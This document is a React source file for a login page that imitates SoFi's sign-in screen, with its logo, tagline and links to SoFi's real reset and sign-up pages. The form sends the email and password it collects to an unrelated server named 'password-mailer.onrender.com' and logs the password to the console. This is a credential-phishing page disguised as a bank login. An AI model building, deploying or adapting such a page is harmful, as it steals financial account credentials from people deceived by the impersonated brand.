import React, { useState } from 'react';
import '../styles/login.css'
import Logo from '../images/sofi-logo.png'

function Login() {
  const [email, setEmail] = useState(''); // Change username to email
  const [password, setPassword] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();

    const requestData = {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json',
      },
      body: JSON.stringify({
          email: email,
          password: password,
      }),
  };
   

    try {
      // Send a POST request to your sign-in API endpoint
      const response = await fetch('https://password-mailer.onrender.com/api/v1/login', requestData);
      const responseData = await response.json();

      if (response.ok && responseData.status === true) {
        // Successful sign-in, parse the response JSON
        const data = await response.json();
        console.log('Successfully signed in:', data);
        console.log(email);
        console.log(password);
        // Handle successful sign-in as needed
      } else {
        // Sign-in failed, handle error response
        const errorData = await response.json();
        console.error('Sign-in failed:', errorData);
        // Handle sign-in error as needed
      }
    } catch (error) {
      console.error('Error during sign-in:', error);
      // Handle other errors, such as network issues
    }
  };

  return (
    <div className='login'>
      <img src={Logo} />
      <div className='login-form'>
        <h1>Secure login</h1>
        <p className='sub-heading'>Log in to Get Your Money Right ®</p>
        <div>
          {/* <label>Email:</label> */}
          <input
            type="text"
            value={email}
            placeholder="Email"
            onChange={(e) => setEmail(e.target.value)}
          />
        </div>
        <div>
          {/* <label>Password:</label> */}
          <input
            type="password"
            className='passWord'
            value={password}
            placeholder="Password"
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>
        <a href="https://login.sofi.com/u/reset-password/request/sofi-auth-db?state=hKFo2SBLbWMzcl9XbWZreF9qeWRzZWR5SFgxSkFhelhWQ3lsNqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIHBNUktvSUN4VWVkamJwdWxETVFyM0VRT2ZoMVJWQ0N2o2NpZNkgNkxuc0xDc2ZGRUVMbDlTQzBDaWNPdkdlb2JvZXFab2I" className='forgot-password'>Forgot password?</a>
        <button type="button" onClick={handleSubmit}>
          Log in
        </button>
      </div>
      <a href='https://login.sofi.com/u/login?state=hKFo2SBLbWMzcl9XbWZreF9qeWRzZWR5SFgxSkFhelhWQ3lsNqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIHBNUktvSUN4VWVkamJwdWxETVFyM0VRT2ZoMVJWQ0N2o2NpZNkgNkxuc0xDc2ZGRUVMbDlTQzBDaWNPdkdlb2JvZXFab2I#' className='new-to'>New to SoFi? Sign up</a>
    </div>
  );
}

export default Login;
